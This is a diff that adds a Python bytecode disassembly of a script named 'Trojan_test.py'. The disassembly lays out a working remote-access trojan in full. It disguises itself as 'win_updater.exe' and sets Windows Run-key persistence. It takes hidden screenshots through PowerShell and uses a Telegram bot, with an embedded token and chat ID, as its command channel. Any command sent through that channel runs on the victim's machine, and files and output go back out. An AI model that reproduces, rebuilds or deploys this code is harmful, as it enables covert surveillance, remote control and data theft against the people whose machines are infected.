@@ -1,0 +1,994 @@
+
+===== <module> =====
+  0           RESUME                   0
+
+  1           LOAD_CONST               0 (0)
+              LOAD_CONST               1 (None)
+              IMPORT_NAME              0 (os)
+              STORE_NAME               0 (os)
+
+  2           LOAD_CONST               0 (0)
+              LOAD_CONST               1 (None)
+              IMPORT_NAME              1 (time)
+              STORE_NAME               1 (time)
+
+  3           LOAD_CONST               0 (0)
+              LOAD_CONST               1 (None)
+              IMPORT_NAME              2 (subprocess)
+              STORE_NAME               2 (subprocess)
+
+  4           LOAD_CONST               0 (0)
+              LOAD_CONST               1 (None)
+              IMPORT_NAME              3 (requests)
+              STORE_NAME               3 (requests)
+
+  6           LOAD_CONST               2 ('8876255842:AAF93POgQf1u-RbfzNNWo8boQK9cAvIKPFM')
+              STORE_NAME               4 (TOKEN)
+
+  7           LOAD_CONST               3 ('8604350172')
+              STORE_NAME               5 (CHAT_ID)
+
+  8           LOAD_CONST               0 (0)
+              STORE_GLOBAL             6 (LAST_UPDATE_ID)
+
+ 10           LOAD_CONST               4 (<code object install_persistence at 0x000001B4B8CA4F80, file "Trojan_test.py", line 10>)
+              MAKE_FUNCTION
+              STORE_NAME               7 (install_persistence)
+
+ 30           LOAD_CONST               5 (<code object take_screenshot at 0x000001B4B89921F0, file "Trojan_test.py", line 30>)
+              MAKE_FUNCTION
+              STORE_NAME               8 (take_screenshot)
+
+ 36           LOAD_CONST               6 (<code object send_text_back at 0x000001B4B8B861F0, file "Trojan_test.py", line 36>)
+              MAKE_FUNCTION
+              STORE_NAME               9 (send_text_back)
+
+ 42           LOAD_CONST               7 (<code object send_file_back at 0x000001B4B8965E30, file "Trojan_test.py", line 42>)
+              MAKE_FUNCTION
+              STORE_NAME              10 (send_file_back)
+
+ 51           LOAD_CONST               8 (<code object listen_and_execute at 0x000001B4B8C41610, file "Trojan_test.py", line 51>)
+              MAKE_FUNCTION
+              STORE_NAME              11 (listen_and_execute)
+
+ 76           LOAD_NAME               12 (__name__)
+              LOAD_CONST               9 ('__main__')
+              COMPARE_OP              88 (bool(==))
+              POP_JUMP_IF_FALSE       35 (to L2)
+
+ 77           LOAD_NAME                7 (install_persistence)
+              PUSH_NULL
+              CALL                     0
+              POP_TOP
+
+ 78           NOP
+
+ 79   L1:     LOAD_NAME               11 (listen_and_execute)
+              PUSH_NULL
+              CALL                     0
+              POP_TOP
+
+ 80           LOAD_NAME                1 (time)
+              LOAD_ATTR               26 (sleep)
+              PUSH_NULL
+              LOAD_CONST              10 (2)
+              CALL                     1
+              POP_TOP
+
+ 78           JUMP_BACKWARD           27 (to L1)
+
+ 76   L2:     RETURN_CONST             1 (None)
+
+Disassembly of <code object install_persistence at 0x000001B4B8CA4F80, file "Trojan_test.py", line 10>:
+  10           RESUME                   0
+
+  11           NOP
+
+  12   L1:     LOAD_GLOBAL              0 (os)
+               LOAD_ATTR                2 (environ)
+               LOAD_ATTR                5 (get + NULL|self)
+               LOAD_CONST               1 ('APPDATA')
+               CALL                     1
+               STORE_FAST               0 (appdata_dir)
+
+  13           LOAD_GLOBAL              0 (os)
+               LOAD_ATTR                6 (path)
+               LOAD_ATTR                9 (join + NULL|self)
+               LOAD_FAST                0 (appdata_dir)
+               LOAD_CONST               2 ('WindowsUpdate')
+               CALL                     2
+               STORE_FAST               1 (malware_folder)
+
+  14           LOAD_GLOBAL              0 (os)
+               LOAD_ATTR                6 (path)
+               LOAD_ATTR               11 (exists + NULL|self)
+               LOAD_FAST                1 (malware_folder)
+               CALL                     1
+               TO_BOOL
+               POP_JUMP_IF_TRUE        22 (to L2)
+
+  15           LOAD_GLOBAL              0 (os)
+               LOAD_ATTR               12 (makedirs)
+               PUSH_NULL
+               LOAD_FAST                1 (malware_folder)
+               CALL                     1
+               POP_TOP
+
+  16   L2:     LOAD_GLOBAL              0 (os)
+               LOAD_ATTR                6 (path)
+               LOAD_ATTR                9 (join + NULL|self)
+               LOAD_FAST                1 (malware_folder)
+               LOAD_CONST               3 ('win_updater.exe')
+               CALL                     2
+               STORE_FAST               2 (target_exe_path)
+
+  18           LOAD_GLOBAL              0 (os)
+               LOAD_ATTR                6 (path)
+               LOAD_ATTR               15 (abspath + NULL|self)
+               LOAD_GLOBAL             16 (subprocess)
+               LOAD_ATTR               18 (sys)
+               LOAD_ATTR               20 (argv)
+               LOAD_CONST               4 (0)
+               BINARY_SUBSCR
+               CALL                     1
+               STORE_FAST               3 (current_file)
+
+  20           LOAD_GLOBAL              0 (os)
+               LOAD_ATTR                6 (path)
+               LOAD_ATTR               15 (abspath + NULL|self)
+               LOAD_FAST                2 (target_exe_path)
+               CALL                     1
+               LOAD_FAST                3 (current_file)
+               COMPARE_OP             119 (bool(!=))
+               POP_JUMP_IF_FALSE      114 (to L4)
+
+  21           LOAD_CONST               4 (0)
+               LOAD_CONST               0 (None)
+               IMPORT_NAME             11 (shutil)
+               STORE_FAST               4 (shutil)
+
+  22           LOAD_CONST               4 (0)
+               LOAD_CONST               0 (None)
+               IMPORT_NAME             12 (winreg)
+               STORE_FAST               5 (winreg)
+
+  23           LOAD_FAST                4 (shutil)
+               LOAD_ATTR               27 (copy + NULL|self)
+               LOAD_FAST_LOAD_FAST     50 (current_file, target_exe_path)
+               CALL                     2
+               POP_TOP
+
+  24           LOAD_FAST                5 (winreg)
+               LOAD_ATTR               29 (OpenKey + NULL|self)
+               LOAD_FAST                5 (winreg)
+               LOAD_ATTR               30 (HKEY_CURRENT_USER)
+               LOAD_CONST               5 ('Software\\Microsoft\\Windows\\CurrentVersion\\Run')
+               LOAD_CONST               4 (0)
+               LOAD_FAST                5 (winreg)
+               LOAD_ATTR               32 (KEY_SET_VALUE)
+               CALL                     4
+               STORE_FAST               6 (key)
+
+  25           LOAD_FAST                5 (winreg)
+               LOAD_ATTR               35 (SetValueEx + NULL|self)
+               LOAD_FAST                6 (key)
+               LOAD_CONST               6 ('WindowsUpdater')
+               LOAD_CONST               4 (0)
+               LOAD_FAST                5 (winreg)
+               LOAD_ATTR               36 (REG_SZ)
+               LOAD_FAST                2 (target_exe_path)
+               CALL                     5
+               POP_TOP
+
+  26           LOAD_FAST                5 (winreg)
+               LOAD_ATTR               39 (CloseKey + NULL|self)
+               LOAD_FAST                6 (key)
+               CALL                     1
+               POP_TOP
+       L3:     RETURN_CONST             0 (None)
+
+  20   L4:     RETURN_CONST             0 (None)
+
+  --   L5:     PUSH_EXC_INFO
+
+  27           POP_TOP
+
+  28   L6:     POP_EXCEPT
+               RETURN_CONST             0 (None)
+
+  --   L7:     COPY                     3
+               POP_EXCEPT
+               RERAISE                  1
+ExceptionTable:
+  L1 to L3 -> L5 [0]
+  L5 to L6 -> L7 [1] lasti
+
+Disassembly of <code object take_screenshot at 0x000001B4B89921F0, file "Trojan_test.py", line 30>:
+ 30           RESUME                   0
+
+ 31           LOAD_GLOBAL              0 (os)
+              LOAD_ATTR                2 (path)
+              LOAD_ATTR                5 (join + NULL|self)
+              LOAD_GLOBAL              0 (os)
+              LOAD_ATTR                6 (environ)
+              LOAD_CONST               1 ('TEMP')
+              BINARY_SUBSCR
+              LOAD_CONST               2 ('sys_temp.png')
+              CALL                     2
+              STORE_FAST               0 (screenshot_path)
+
+ 32           LOAD_CONST               3 ("[Reflection.Assembly]::LoadWithPartialName('System.Drawing') | Out-Null; [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $bmp.Save('")
+              LOAD_FAST                0 (screenshot_path)
+              LOAD_ATTR                9 (replace + NULL|self)
+              LOAD_CONST               4 ('\\')
+              LOAD_CONST               5 ('\\\\')
+              CALL                     2
+              BINARY_OP                0 (+)
+              LOAD_CONST               6 ("', [System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $bmp.Dispose();")
+              BINARY_OP                0 (+)
+              STORE_FAST               1 (ps_script)
+
+ 33           LOAD_GLOBAL             10 (subprocess)
+              LOAD_ATTR               12 (run)
+              PUSH_NULL
+              LOAD_CONST               7 ('powershell')
+              LOAD_CONST               8 ('-Command')
+              LOAD_FAST                1 (ps_script)
+              BUILD_LIST               3
+              LOAD_GLOBAL             10 (subprocess)
+              LOAD_ATTR               14 (CREATE_NO_WINDOW)
+              LOAD_CONST               9 (('creationflags',))
+              CALL_KW                  2
+              POP_TOP
+
+ 34           LOAD_FAST                0 (screenshot_path)
+              RETURN_VALUE
+
+Disassembly of <code object send_text_back at 0x000001B4B8B861F0, file "Trojan_test.py", line 36>:
+  36           RESUME                   0
+
+  37           LOAD_CONST               1 ('https://api.telegram.org/bot')
+               LOAD_GLOBAL              0 (TOKEN)
+               FORMAT_SIMPLE
+               LOAD_CONST               2 ('/sendMessage')
+               BUILD_STRING             3
+               STORE_FAST               1 (url)
+
+  38           LOAD_GLOBAL              2 (CHAT_ID)
+               LOAD_GLOBAL              5 (str + NULL)
+               LOAD_FAST                0 (text)
+               CALL                     1
+               LOAD_CONST               3 (('chat_id', 'text'))
+               BUILD_CONST_KEY_MAP      2
+               STORE_FAST               2 (payload)
+
+  39   L1:     LOAD_GLOBAL              6 (requests)
+               LOAD_ATTR                8 (post)
+               PUSH_NULL
+               LOAD_FAST_LOAD_FAST     18 (url, payload)
+               LOAD_CONST               4 (5)
+               LOAD_CONST               5 (('json', 'timeout'))
+               CALL_KW                  3
+               POP_TOP
+       L2:     RETURN_CONST             0 (None)
+
+  --   L3:     PUSH_EXC_INFO
+
+  40           POP_TOP
+       L4:     POP_EXCEPT
+               RETURN_CONST             0 (None)
+
+  --   L5:     COPY                     3
+               POP_EXCEPT
+               RERAISE                  1
+ExceptionTable:
+  L1 to L2 -> L3 [0]
+  L3 to L4 -> L5 [1] lasti
+
+Disassembly of <code object send_file_back at 0x000001B4B8965E30, file "Trojan_test.py", line 42>:
+  42            RESUME                   0
+
+  43            LOAD_CONST               1 ('https://api.telegram.org/bot')
+                LOAD_GLOBAL              0 (TOKEN)
+                FORMAT_SIMPLE
+                LOAD_CONST               2 ('/sendDocument')
+                BUILD_STRING             3
+                STORE_FAST               1 (url)
+
+  44            LOAD_CONST               3 ('chat_id')
+                LOAD_GLOBAL              2 (CHAT_ID)
+                BUILD_MAP                1
+                STORE_FAST               2 (payload)
+
+  45            NOP
+
+  46    L1:     LOAD_GLOBAL              5 (open + NULL)
+                LOAD_FAST                0 (file_path)
+                LOAD_CONST               4 ('rb')
+                CALL                     2
+                BEFORE_WITH
+        L2:     STORE_FAST               3 (f)
+
+  47            LOAD_CONST               5 ('document')
+                LOAD_FAST                3 (f)
+                BUILD_MAP                1
+                STORE_FAST               4 (files)
+
+  48            LOAD_GLOBAL              6 (requests)
+                LOAD_ATTR                8 (post)
+                PUSH_NULL
+                LOAD_FAST_LOAD_FAST     18 (url, payload)
+                LOAD_FAST                4 (files)
+                LOAD_CONST               6 (10)
+                LOAD_CONST               7 (('data', 'files', 'timeout'))
+                CALL_KW                  4
+                POP_TOP
+
+  46    L3:     LOAD_CONST               0 (None)
+                LOAD_CONST               0 (None)
+                LOAD_CONST               0 (None)
+                CALL                     2
+                POP_TOP
+        L4:     RETURN_CONST             0 (None)
+        L5:     PUSH_EXC_INFO
+                WITH_EXCEPT_START
+                TO_BOOL
+                POP_JUMP_IF_TRUE         1 (to L6)
+                RERAISE                  2
+        L6:     POP_TOP
+        L7:     POP_EXCEPT
+                POP_TOP
+                POP_TOP
+        L8:     RETURN_CONST             0 (None)
+
+  --    L9:     COPY                     3
+                POP_EXCEPT
+                RERAISE                  1
+       L10:     PUSH_EXC_INFO
+
+  49            POP_TOP
+       L11:     POP_EXCEPT
+                RETURN_CONST             0 (None)
+
+  --   L12:     COPY                     3
+                POP_EXCEPT
+                RERAISE                  1
+ExceptionTable:
+  L1 to L2 -> L10 [0]
+  L2 to L3 -> L5 [1] lasti
+  L3 to L4 -> L10 [0]
+  L5 to L7 -> L9 [3] lasti
+  L7 to L8 -> L10 [0]
+  L9 to L10 -> L10 [0]
+  L10 to L11 -> L12 [1] lasti
+
+Disassembly of <code object listen_and_execute at 0x000001B4B8C41610, file "Trojan_test.py", line 51>:
+  51            RESUME                   0
+
+  53            LOAD_CONST               1 ('https://api.telegram.org/bot')
+                LOAD_GLOBAL              0 (TOKEN)
+                FORMAT_SIMPLE
+                LOAD_CONST               2 ('/getUpdates')
+                BUILD_STRING             3
+                STORE_FAST               0 (url)
+
+  54            LOAD_GLOBAL              2 (LAST_UPDATE_ID)
+                LOAD_CONST               3 (1)
+                BINARY_OP                0 (+)
+                LOAD_CONST               4 (5)
+                LOAD_CONST               5 (('offset', 'timeout'))
+                BUILD_CONST_KEY_MAP      2
+                STORE_FAST               1 (params)
+
+  55            NOP
+
+  56    L1:     LOAD_GLOBAL              4 (requests)
+                LOAD_ATTR                6 (get)
+                PUSH_NULL
+                LOAD_FAST_LOAD_FAST      1 (url, params)
+                LOAD_CONST               6 (10)
+                LOAD_CONST               7 (('params', 'timeout'))
+                CALL_KW                  3
+                LOAD_ATTR                9 (json + NULL|self)
+                CALL                     0
+                STORE_FAST               2 (response)
+
+  57            LOAD_FAST                2 (response)
+                LOAD_ATTR                7 (get + NULL|self)
+                LOAD_CONST               8 ('ok')
+                CALL                     1
+                TO_BOOL
+                EXTENDED_ARG             1
+                POP_JUMP_IF_FALSE      265 (to L14)
+                LOAD_FAST                2 (response)
+                LOAD_ATTR                7 (get + NULL|self)
+                LOAD_CONST               9 ('result')
+                CALL                     1
+                TO_BOOL
+                POP_JUMP_IF_FALSE      242 (to L13)
+
+  58            LOAD_FAST                2 (response)
+                LOAD_CONST               9 ('result')
+                BINARY_SUBSCR
+                GET_ITER
+        L2:     FOR_ITER               232 (to L11)
+                STORE_FAST               3 (update)
+
+  59            LOAD_FAST                3 (update)
+                LOAD_CONST              10 ('update_id')
+                BINARY_SUBSCR
+                STORE_GLOBAL             1 (LAST_UPDATE_ID)
+
+  60            LOAD_FAST                3 (update)
+                LOAD_ATTR                7 (get + NULL|self)
+                LOAD_CONST              11 ('message')
+                BUILD_MAP                0
+                CALL                     2
+                STORE_FAST               4 (message)
+
+  61            LOAD_FAST                4 (message)
+                LOAD_ATTR                7 (get + NULL|self)
+                LOAD_CONST              12 ('text')
+                LOAD_CONST              13 ('')
+                CALL                     2
+                LOAD_ATTR               11 (strip + NULL|self)
+                CALL                     0
+                STORE_FAST               5 (text)
+
+  63            LOAD_FAST                5 (text)
+                LOAD_CONST              14 ('SCREENSHOT')
+                COMPARE_OP              88 (bool(==))
+                POP_JUMP_IF_FALSE       83 (to L6)
+
+  64            LOAD_GLOBAL             13 (take_screenshot + NULL)
+                CALL                     0
+                STORE_FAST               6 (path)
+
+  65            LOAD_GLOBAL             14 (os)
+                LOAD_ATTR               16 (path)
+                LOAD_ATTR               19 (exists + NULL|self)
+                LOAD_FAST                6 (path)
+                CALL                     1
+                TO_BOOL
+                POP_JUMP_IF_FALSE       35 (to L5)
+
+  66            LOAD_GLOBAL             21 (send_file_back + NULL)
+                LOAD_FAST                6 (path)
+                CALL                     1
+                POP_TOP
+
+  67    L3:     LOAD_GLOBAL             14 (os)
+                LOAD_ATTR               22 (remove)
+                PUSH_NULL
+                LOAD_FAST                6 (path)
+                CALL                     1
+                POP_TOP
+        L4:     JUMP_BACKWARD          145 (to L2)
+
+  65    L5:     JUMP_BACKWARD          147 (to L2)
+
+  69    L6:     LOAD_FAST                5 (text)
+                LOAD_ATTR               25 (startswith + NULL|self)
+                LOAD_CONST              15 ('CMD ')
+                CALL                     1
+                TO_BOOL
+        L7:     POP_JUMP_IF_TRUE         2 (to L8)
+                JUMP_BACKWARD          171 (to L2)
+
+  70    L8:     LOAD_FAST                5 (text)
+                LOAD_CONST              16 (4)
+                LOAD_CONST               0 (None)
+                BINARY_SLICE
+                STORE_FAST               7 (cmd_str)
+
+  71            LOAD_GLOBAL             26 (subprocess)
+                LOAD_ATTR               28 (getoutput)
+                PUSH_NULL
+                LOAD_FAST                7 (cmd_str)
+                CALL                     1
+                STORE_FAST               8 (output)
+
+  72            LOAD_GLOBAL             31 (send_text_back + NULL)
+                LOAD_FAST                8 (output)
+                LOAD_ATTR               11 (strip + NULL|self)
+                CALL                     0
+                TO_BOOL
+                POP_JUMP_IF_FALSE        2 (to L9)
+                LOAD_FAST                8 (output)
+                JUMP_FORWARD             1 (to L10)
+        L9:     LOAD_CONST              17 ('[+] Chay thanh cong.')
+       L10:     CALL                     1
+                POP_TOP
+                JUMP_BACKWARD          234 (to L2)
+
+  58   L11:     END_FOR
+                POP_TOP
+       L12:     RETURN_CONST             0 (None)
+
+  57   L13:     RETURN_CONST             0 (None)
+       L14:     RETURN_CONST             0 (None)
+
+  --   L15:     PUSH_EXC_INFO
+
+  68            POP_TOP
+       L16:     POP_EXCEPT
+                JUMP_BACKWARD          244 (to L2)
+
+  --   L17:     COPY                     3
+                POP_EXCEPT
+                RERAISE                  1
+       L18:     PUSH_EXC_INFO
+
+  73            POP_TOP
+
+  74   L19:     POP_EXCEPT
+                RETURN_CONST             0 (None)
+
+  --   L20:     COPY                     3
+                POP_EXCEPT
+                RERAISE                  1
+ExceptionTable:
+  L1 to L3 -> L18 [0]
+  L3 to L4 -> L15 [1]
+  L4 to L7 -> L18 [0]
+  L8 to L12 -> L18 [0]
+  L15 to L16 -> L17 [2] lasti
+  L16 to L18 -> L18 [0]
+  L18 to L19 -> L20 [1] lasti
+
+===== install_persistence =====
+  10           RESUME                   0
+
+  11           NOP
+
+  12   L1:     LOAD_GLOBAL              0 (os)
+               LOAD_ATTR                2 (environ)
+               LOAD_ATTR                5 (get + NULL|self)
+               LOAD_CONST               1 ('APPDATA')
+               CALL                     1
+               STORE_FAST               0 (appdata_dir)
+
+  13           LOAD_GLOBAL              0 (os)
+               LOAD_ATTR                6 (path)
+               LOAD_ATTR                9 (join + NULL|self)
+               LOAD_FAST                0 (appdata_dir)
+               LOAD_CONST               2 ('WindowsUpdate')
+               CALL                     2
+               STORE_FAST               1 (malware_folder)
+
+  14           LOAD_GLOBAL              0 (os)
+               LOAD_ATTR                6 (path)
+               LOAD_ATTR               11 (exists + NULL|self)
+               LOAD_FAST                1 (malware_folder)
+               CALL                     1
+               TO_BOOL
+               POP_JUMP_IF_TRUE        22 (to L2)
+
+  15           LOAD_GLOBAL              0 (os)
+               LOAD_ATTR               12 (makedirs)
+               PUSH_NULL
+               LOAD_FAST                1 (malware_folder)
+               CALL                     1
+               POP_TOP
+
+  16   L2:     LOAD_GLOBAL              0 (os)
+               LOAD_ATTR                6 (path)
+               LOAD_ATTR                9 (join + NULL|self)
+               LOAD_FAST                1 (malware_folder)
+               LOAD_CONST               3 ('win_updater.exe')
+               CALL                     2
+               STORE_FAST               2 (target_exe_path)
+
+  18           LOAD_GLOBAL              0 (os)
+               LOAD_ATTR                6 (path)
+               LOAD_ATTR               15 (abspath + NULL|self)
+               LOAD_GLOBAL             16 (subprocess)
+               LOAD_ATTR               18 (sys)
+               LOAD_ATTR               20 (argv)
+               LOAD_CONST               4 (0)
+               BINARY_SUBSCR
+               CALL                     1
+               STORE_FAST               3 (current_file)
+
+  20           LOAD_GLOBAL              0 (os)
+               LOAD_ATTR                6 (path)
+               LOAD_ATTR               15 (abspath + NULL|self)
+               LOAD_FAST                2 (target_exe_path)
+               CALL                     1
+               LOAD_FAST                3 (current_file)
+               COMPARE_OP             119 (bool(!=))
+               POP_JUMP_IF_FALSE      114 (to L4)
+
+  21           LOAD_CONST               4 (0)
+               LOAD_CONST               0 (None)
+               IMPORT_NAME             11 (shutil)
+               STORE_FAST               4 (shutil)
+
+  22           LOAD_CONST               4 (0)
+               LOAD_CONST               0 (None)
+               IMPORT_NAME             12 (winreg)
+               STORE_FAST               5 (winreg)
+
+  23           LOAD_FAST                4 (shutil)
+               LOAD_ATTR               27 (copy + NULL|self)
+               LOAD_FAST_LOAD_FAST     50 (current_file, target_exe_path)
+               CALL                     2
+               POP_TOP
+
+  24           LOAD_FAST                5 (winreg)
+               LOAD_ATTR               29 (OpenKey + NULL|self)
+               LOAD_FAST                5 (winreg)
+               LOAD_ATTR               30 (HKEY_CURRENT_USER)
+               LOAD_CONST               5 ('Software\\Microsoft\\Windows\\CurrentVersion\\Run')
+               LOAD_CONST               4 (0)
+               LOAD_FAST                5 (winreg)
+               LOAD_ATTR               32 (KEY_SET_VALUE)
+               CALL                     4
+               STORE_FAST               6 (key)
+
+  25           LOAD_FAST                5 (winreg)
+               LOAD_ATTR               35 (SetValueEx + NULL|self)
+               LOAD_FAST                6 (key)
+               LOAD_CONST               6 ('WindowsUpdater')
+               LOAD_CONST               4 (0)
+               LOAD_FAST                5 (winreg)
+               LOAD_ATTR               36 (REG_SZ)
+               LOAD_FAST                2 (target_exe_path)
+               CALL                     5
+               POP_TOP
+
+  26           LOAD_FAST                5 (winreg)
+               LOAD_ATTR               39 (CloseKey + NULL|self)
+               LOAD_FAST                6 (key)
+               CALL                     1
+               POP_TOP
+       L3:     RETURN_CONST             0 (None)
+
+  20   L4:     RETURN_CONST             0 (None)
+
+  --   L5:     PUSH_EXC_INFO
+
+  27           POP_TOP
+
+  28   L6:     POP_EXCEPT
+               RETURN_CONST             0 (None)
+
+  --   L7:     COPY                     3
+               POP_EXCEPT
+               RERAISE                  1
+ExceptionTable:
+  L1 to L3 -> L5 [0]
+  L5 to L6 -> L7 [1] lasti
+
+===== take_screenshot =====
+ 30           RESUME                   0
+
+ 31           LOAD_GLOBAL              0 (os)
+              LOAD_ATTR                2 (path)
+              LOAD_ATTR                5 (join + NULL|self)
+              LOAD_GLOBAL              0 (os)
+              LOAD_ATTR                6 (environ)
+              LOAD_CONST               1 ('TEMP')
+              BINARY_SUBSCR
+              LOAD_CONST               2 ('sys_temp.png')
+              CALL                     2
+              STORE_FAST               0 (screenshot_path)
+
+ 32           LOAD_CONST               3 ("[Reflection.Assembly]::LoadWithPartialName('System.Drawing') | Out-Null; [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height); $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size); $bmp.Save('")
+              LOAD_FAST                0 (screenshot_path)
+              LOAD_ATTR                9 (replace + NULL|self)
+              LOAD_CONST               4 ('\\')
+              LOAD_CONST               5 ('\\\\')
+              CALL                     2
+              BINARY_OP                0 (+)
+              LOAD_CONST               6 ("', [System.Drawing.Imaging.ImageFormat]::Png); $graphics.Dispose(); $bmp.Dispose();")
+              BINARY_OP                0 (+)
+              STORE_FAST               1 (ps_script)
+
+ 33           LOAD_GLOBAL             10 (subprocess)
+              LOAD_ATTR               12 (run)
+              PUSH_NULL
+              LOAD_CONST               7 ('powershell')
+              LOAD_CONST               8 ('-Command')
+              LOAD_FAST                1 (ps_script)
+              BUILD_LIST               3
+              LOAD_GLOBAL             10 (subprocess)
+              LOAD_ATTR               14 (CREATE_NO_WINDOW)
+              LOAD_CONST               9 (('creationflags',))
+              CALL_KW                  2
+              POP_TOP
+
+ 34           LOAD_FAST                0 (screenshot_path)
+              RETURN_VALUE
+
+===== send_text_back =====
+  36           RESUME                   0
+
+  37           LOAD_CONST               1 ('https://api.telegram.org/bot')
+               LOAD_GLOBAL              0 (TOKEN)
+               FORMAT_SIMPLE
+               LOAD_CONST               2 ('/sendMessage')
+               BUILD_STRING             3
+               STORE_FAST               1 (url)
+
+  38           LOAD_GLOBAL              2 (CHAT_ID)
+               LOAD_GLOBAL              5 (str + NULL)
+               LOAD_FAST                0 (text)
+               CALL                     1
+               LOAD_CONST               3 (('chat_id', 'text'))
+               BUILD_CONST_KEY_MAP      2
+               STORE_FAST               2 (payload)
+
+  39   L1:     LOAD_GLOBAL              6 (requests)
+               LOAD_ATTR                8 (post)
+               PUSH_NULL
+               LOAD_FAST_LOAD_FAST     18 (url, payload)
+               LOAD_CONST               4 (5)
+               LOAD_CONST               5 (('json', 'timeout'))
+               CALL_KW                  3
+               POP_TOP
+       L2:     RETURN_CONST             0 (None)
+
+  --   L3:     PUSH_EXC_INFO
+
+  40           POP_TOP
+       L4:     POP_EXCEPT
+               RETURN_CONST             0 (None)
+
+  --   L5:     COPY                     3
+               POP_EXCEPT
+               RERAISE                  1
+ExceptionTable:
+  L1 to L2 -> L3 [0]
+  L3 to L4 -> L5 [1] lasti
+
+===== send_file_back =====
+  42            RESUME                   0
+
+  43            LOAD_CONST               1 ('https://api.telegram.org/bot')
+                LOAD_GLOBAL              0 (TOKEN)
+                FORMAT_SIMPLE
+                LOAD_CONST               2 ('/sendDocument')
+                BUILD_STRING             3
+                STORE_FAST               1 (url)
+
+  44            LOAD_CONST               3 ('chat_id')
+                LOAD_GLOBAL              2 (CHAT_ID)
+                BUILD_MAP                1
+                STORE_FAST               2 (payload)
+
+  45            NOP
+
+  46    L1:     LOAD_GLOBAL              5 (open + NULL)
+                LOAD_FAST                0 (file_path)
+                LOAD_CONST               4 ('rb')
+                CALL                     2
+                BEFORE_WITH
+        L2:     STORE_FAST               3 (f)
+
+  47            LOAD_CONST               5 ('document')
+                LOAD_FAST                3 (f)
+                BUILD_MAP                1
+                STORE_FAST               4 (files)
+
+  48            LOAD_GLOBAL              6 (requests)
+                LOAD_ATTR                8 (post)
+                PUSH_NULL
+                LOAD_FAST_LOAD_FAST     18 (url, payload)
+                LOAD_FAST                4 (files)
+                LOAD_CONST               6 (10)
+                LOAD_CONST               7 (('data', 'files', 'timeout'))
+                CALL_KW                  4
+                POP_TOP
+
+  46    L3:     LOAD_CONST               0 (None)
+                LOAD_CONST               0 (None)
+                LOAD_CONST               0 (None)
+                CALL                     2
+                POP_TOP
+        L4:     RETURN_CONST             0 (None)
+        L5:     PUSH_EXC_INFO
+                WITH_EXCEPT_START
+                TO_BOOL
+                POP_JUMP_IF_TRUE         1 (to L6)
+                RERAISE                  2
+        L6:     POP_TOP
+        L7:     POP_EXCEPT
+                POP_TOP
+                POP_TOP
+        L8:     RETURN_CONST             0 (None)
+
+  --    L9:     COPY                     3
+                POP_EXCEPT
+                RERAISE                  1
+       L10:     PUSH_EXC_INFO
+
+  49            POP_TOP
+       L11:     POP_EXCEPT
+                RETURN_CONST             0 (None)
+
+  --   L12:     COPY                     3
+                POP_EXCEPT
+                RERAISE                  1
+ExceptionTable:
+  L1 to L2 -> L10 [0]
+  L2 to L3 -> L5 [1] lasti
+  L3 to L4 -> L10 [0]
+  L5 to L7 -> L9 [3] lasti
+  L7 to L8 -> L10 [0]
+  L9 to L10 -> L10 [0]
+  L10 to L11 -> L12 [1] lasti
+
+===== listen_and_execute =====
+  51            RESUME                   0
+
+  53            LOAD_CONST               1 ('https://api.telegram.org/bot')
+                LOAD_GLOBAL              0 (TOKEN)
+                FORMAT_SIMPLE
+                LOAD_CONST               2 ('/getUpdates')
+                BUILD_STRING             3
+                STORE_FAST               0 (url)
+
+  54            LOAD_GLOBAL              2 (LAST_UPDATE_ID)
+                LOAD_CONST               3 (1)
+                BINARY_OP                0 (+)
+                LOAD_CONST               4 (5)
+                LOAD_CONST               5 (('offset', 'timeout'))
+                BUILD_CONST_KEY_MAP      2
+                STORE_FAST               1 (params)
+
+  55            NOP
+
+  56    L1:     LOAD_GLOBAL              4 (requests)
+                LOAD_ATTR                6 (get)
+                PUSH_NULL
+                LOAD_FAST_LOAD_FAST      1 (url, params)
+                LOAD_CONST               6 (10)
+                LOAD_CONST               7 (('params', 'timeout'))
+                CALL_KW                  3
+                LOAD_ATTR                9 (json + NULL|self)
+                CALL                     0
+                STORE_FAST               2 (response)
+
+  57            LOAD_FAST                2 (response)
+                LOAD_ATTR                7 (get + NULL|self)
+                LOAD_CONST               8 ('ok')
+                CALL                     1
+                TO_BOOL
+                EXTENDED_ARG             1
+                POP_JUMP_IF_FALSE      265 (to L14)
+                LOAD_FAST                2 (response)
+                LOAD_ATTR                7 (get + NULL|self)
+                LOAD_CONST               9 ('result')
+                CALL                     1
+                TO_BOOL
+                POP_JUMP_IF_FALSE      242 (to L13)
+
+  58            LOAD_FAST                2 (response)
+                LOAD_CONST               9 ('result')
+                BINARY_SUBSCR
+                GET_ITER
+        L2:     FOR_ITER               232 (to L11)
+                STORE_FAST               3 (update)
+
+  59            LOAD_FAST                3 (update)
+                LOAD_CONST              10 ('update_id')
+                BINARY_SUBSCR
+                STORE_GLOBAL             1 (LAST_UPDATE_ID)
+
+  60            LOAD_FAST                3 (update)
+                LOAD_ATTR                7 (get + NULL|self)
+                LOAD_CONST              11 ('message')
+                BUILD_MAP                0
+                CALL                     2
+                STORE_FAST               4 (message)
+
+  61            LOAD_FAST                4 (message)
+                LOAD_ATTR                7 (get + NULL|self)
+                LOAD_CONST              12 ('text')
+                LOAD_CONST              13 ('')
+                CALL                     2
+                LOAD_ATTR               11 (strip + NULL|self)
+                CALL                     0
+                STORE_FAST               5 (text)
+
+  63            LOAD_FAST                5 (text)
+                LOAD_CONST              14 ('SCREENSHOT')
+                COMPARE_OP              88 (bool(==))
+                POP_JUMP_IF_FALSE       83 (to L6)
+
+  64            LOAD_GLOBAL             13 (take_screenshot + NULL)
+                CALL                     0
+                STORE_FAST               6 (path)
+
+  65            LOAD_GLOBAL             14 (os)
+                LOAD_ATTR               16 (path)
+                LOAD_ATTR               19 (exists + NULL|self)
+                LOAD_FAST                6 (path)
+                CALL                     1
+                TO_BOOL
+                POP_JUMP_IF_FALSE       35 (to L5)
+
